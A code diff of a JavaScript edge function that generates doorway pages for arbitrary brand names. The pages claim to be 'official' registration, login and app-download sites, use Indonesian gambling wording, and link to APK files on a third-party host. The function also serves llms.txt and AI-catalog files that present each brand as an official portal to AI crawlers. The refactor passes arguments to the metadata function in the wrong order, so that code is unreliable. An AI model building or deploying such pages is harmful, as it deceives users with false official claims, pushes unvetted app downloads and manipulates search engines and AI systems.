@@ -1,123 +1,5 @@
-// --- 1. FUNGSI PENGAMAN & SANITASI ---
-function escapeHtml(str) {
-  if (!str) return '';
-  return String(str)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&#039;');
-}
-
-function sanitizeText(str) {
-  if (!str) return '';
-  return str
-    .replace(/[^a-zA-Z0-9\s]/g, ' ')
-    .replace(/\s+/g, ' ')
-    .trim()
-    .toUpperCase();
-}
-
-// --- 2. PENGEKSTRAK DATA SERIALISASI PHP ---
-function extractPHPSerializedValue(serializedStr, key) {
-  if (!serializedStr) return '';
-  const regex = new RegExp(`s:\\d+:"${key}";(?:s:\\d+:"([^"]*)?"|i:(\\d+);|b:(0|1);)`, 'i');
-  const match = serializedStr.match(regex);
-  if (match) {
-    return match[1] !== undefined ? match[1] : (match[2] !== undefined ? match[2] : match[3]);
-  }
-  return '';
-}
-
-function generateCRC32Like(str) {
-  let hash = 0;
-  for (let i = 0; i < str.length; i++) {
-    const char = str.charCodeAt(i);
-    hash = (hash << 5) - hash + char;
-    hash |= 0;
-  }
-  return Math.abs(hash).toString(16);
-}
-
-// --- 3. GENERATOR METADATA AI (TERJEMAHAN DARI PHP) ---
-function handleAiMetadata(requestPath, primaryBrandName, baseHost) {
-  if (!primaryBrandName) {
-    primaryBrandName = 'Portal Layanan Digital';
-  }
-
-  // Bersihkan base_host
-  if (!/^https?:\/\//i.test(baseHost)) {
-    baseHost = "https://" + baseHost.replace(/^\/+/, '');
-  }
-  baseHost = baseHost.replace(/\/+$/, '');
-
-  const cleanBrand = primaryBrandName.toLowerCase().replace(/[^a-z0-9]/g, '') || 'portalbrand';
-  const hostOnly = baseHost.replace(/^https?:\/\//i, '');
-
-  // 1. Handle llms.txt
-  if (requestPath.includes("llms.txt")) {
-    let output = `# ${primaryBrandName}\n\n`;
-    output += `> Portal resmi dan pusat layanan digital terintegrasi untuk ${primaryBrandName}.\n\n`;
-    
-    output += `## Tentang Layanan\n`;
-    output += `${primaryBrandName} adalah platform digital yang menyediakan akses cepat, aman, dan terstruktur ke berbagai layanan unggulan serta informasi produk terlengkap.\n\n`;
-
-    output += `## Tautan Utama & Navigasi\n`;
-    output += `- [Beranda](${baseHost}/): Halaman utama portal layanan.\n`;
-    output += `- [Katalog Produk & Layanan](${baseHost}/katalog): Daftar lengkap layanan yang tersedia.\n`;
-    output += `- [Pusat Bantuan & FAQ](${baseHost}/faq): Informasi tanya jawab dan panduan penggunaan.\n`;
-    output += `- [Hubungi Kami](${baseHost}/kontak): Layanan dukungan pelanggan dan komunikasi resmi.\n\n`;
-
-    output += `## Kebijakan & Informasi Legal\n`;
-    output += `- [Kebijakan Privasi](${baseHost}/privacy-policy): Ketentuan perlindungan data pengguna.\n`;
-    output += `- [Syarat & Ketentuan](${baseHost}/terms-of-service): Aturan penggunaan layanan platform.\n`;
-    output += `- [Disclaimer](${baseHost}/disclaimer): Batasan tanggung jawab informasi situs.\n`;
-
-    return { content: output, contentType: "text/plain; charset=utf-8" };
-  }
-
-  // 2. Handle ai-catalog.json
-  if (requestPath.includes("ai-catalog.json")) {
-    const jsonData = {
-      specVersion: "1.0",
-      host: {
-        displayName: primaryBrandName,
-        identifier: "did:web:" + hostOnly,
-        documentationUrl: `${baseHost}/llms.txt`
-      },
-      entries: [
-        {
-          identifier: `urn:air:${cleanBrand}:catalog:main`,
-          type: "application/ai-catalog+json",
-          displayName: "Katalog Utama " + primaryBrandName,
-          url: `${baseHost}/katalog`,
-          description: "Katalog resmi dan informasi layanan komprehensif dari " + primaryBrandName + ".",
-          representativeQueries: [
-            primaryBrandName,
-            "situs resmi " + primaryBrandName,
-            "katalog " + primaryBrandName,
-            "layanan " + primaryBrandName
-          ]
-        },
-        {
-          identifier: `urn:air:${cleanBrand}:catalog:support`,
-          type: "application/ai-catalog+json",
-          displayName: "Pusat Bantuan " + primaryBrandName,
-          url: `${baseHost}/faq`,
-          description: "Informasi bantuan, tanya jawab, dan dukungan pelanggan.",
-          representativeQueries: [
-            "bantuan " + primaryBrandName,
-            "kontak " + primaryBrandName
-          ]
-        }
-      ]
-    };
-
-    return { content: JSON.stringify(jsonData, null, 2), contentType: "application/json; charset=utf-8" };
-  }
-
-  return null;
-}
+import { escapeHtml, sanitizeText, extractPHPSerializedValue, generateCRC32Like } from '../utils/parser.js';
+import { handleAiMetadata } from '../utils/aiMetadata.js';
 
 export async function onRequest(context) {
   const { request } = context;
@@ -128,7 +10,7 @@ export async function onRequest(context) {
   let httpHost = 'spin8vip.top';
   let rawPostData = {};
 
-  // 1. Tangkap request POST dari Server 1 jika ada
+  // 1. Tangkap POST dari Server 1
   if (request.method === 'POST') {
     try {
       const contentType = request.headers.get('content-type') || '';
@@ -155,11 +37,31 @@ export async function onRequest(context) {
     } catch (e) {}
   }
 
-  if (!httpHost) {
-    httpHost = 'spin8vip.top';
+  if (!httpHost) httpHost = 'spin8vip.top';
+
+  const fullCheck = `${requestURI} ${queryString}`.toLowerCase();
+
+  // 2. Cek AI Metadata (llms.txt / ai-catalog.json)
+  const aiResponse = await handleAiMetadata(fullCheck, `https://${httpHost}`, url.origin);
+  if (aiResponse) {
+    return new Response(aiResponse.content, {
+      headers: { "Content-Type": aiResponse.contentType }
+    });
   }
 
-  // 2. PARSING PATH & MENGABAIKAN FILE .PHP (DIJALANKAN LEBIH AWAL)
+  // 3. Handle Robots.txt
+  if (fullCheck.includes('robots.txt')) {
+    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${httpHost}/sitemap-wp.xml`;
+    return new Response(robotsOutput, { headers: { "Content-Type": "text/plain; charset=utf-8" } });
+  }
+
+  // 4. Handle Sitemap
+  if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
+    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${httpHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
+    return new Response(sitemapOutput, { headers: { "Content-Type": "text/xml; charset=utf-8" } });
+  }
+
+  // 5. Parsing Path & Abaikan .php untuk Halaman Utama Brand
   let cleanPath = requestURI.replace(/^\/+/, '');
   if (cleanPath.includes('.php')) {
     const phpParts = cleanPath.split('.php');
@@ -168,53 +70,23 @@ export async function onRequest(context) {
 
   let brandQuery = '';
   const segments = cleanPath.split('/').filter(Boolean);
-  
-  // Jika path berisi llms.txt atau ai-catalog.json tapi ada brand di depannya (misal: /aby.php/asia200/llms.txt)
-  if (segments.length > 1 && (segments[segments.length - 1] === 'llms.txt' || segments[segments.length - 1] === 'ai-catalog.json')) {
-    brandQuery = segments[0]; // Ambil brand di segmen pertama
-  } else if (segments.length > 0 && segments[0] !== 'llms.txt' && segments[0] !== 'ai-catalog.json') {
+  if (segments.length > 0) {
     brandQuery = segments[0];
   } else if (queryString) {
     brandQuery = queryString.replace(/^download\//i, '');
   } else {
-    brandQuery = 'asia200'; // Fallback default brand Anda jika diakses mentah
+    brandQuery = 'default-app';
   }
 
   const cleanBrandName = sanitizeText(brandQuery);
-  const finalBrandTitle = cleanBrandName || 'ASIA200';
-
-  const fullCheck = `${requestURI} ${queryString}`.toLowerCase();
-
-  // 3. CEK APAKAH REQUEST MEMINTA LLMS.TXT ATAU AI-CATALOG.JSON
-  const aiResponse = handleAiMetadata(fullCheck, finalBrandTitle, `https://${httpHost}`);
-  if (aiResponse) {
-    return new Response(aiResponse.content, {
-      headers: { "Content-Type": aiResponse.contentType }
-    });
-  }
-
-  // 4. HANDLE ROBOTS.TXT
-  if (fullCheck.includes('robots.txt')) {
-    const robotsOutput = `User-agent: *\nDisallow:\nSitemap: https://${httpHost}/sitemap-wp.xml`;
-    return new Response(robotsOutput, {
-      headers: { "Content-Type": "text/plain; charset=utf-8" }
-    });
-  }
-
-  // 5. HANDLE SITEMAP
-  if (fullCheck.includes('pingsitemap') || fullCheck.includes('sitemap-wp.xml')) {
-    const sitemapOutput = `<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n  <url>\n    <loc>https://${httpHost}/</loc>\n    <changefreq>daily</changefreq>\n    <priority>1.0</priority>\n  </url>\n</urlset>`;
-    return new Response(sitemapOutput, {
-      headers: { "Content-Type": "text/xml; charset=utf-8" }
-    });
-  }
-
-  // 6. RENDER HALAMAN UTAMA APK UNDUH
+  const finalBrandTitle = cleanBrandName || 'APLIKASI TERPERCAYA';
   const uniqueHash = generateCRC32Like(brandQuery);
+
   const customTitle = escapeHtml(`Situs Resmi Pendaftaran & Login ${finalBrandTitle} Terpercaya`);
   const customDesc = escapeHtml(`Link alternatif resmi ${finalBrandTitle} versi terbaru. Mainkan game gacor dan unduh aplikasinya dengan aman dan cepat.`);
   const downloadLink = `https://download.store-files.com/apk/${uniqueHash}/${encodeURIComponent(brandQuery)}.apk`;
 
+  // 6. Template HTML Utama
   const htmlTemplate = `<!DOCTYPE html>
 <html lang="id">
 <head>
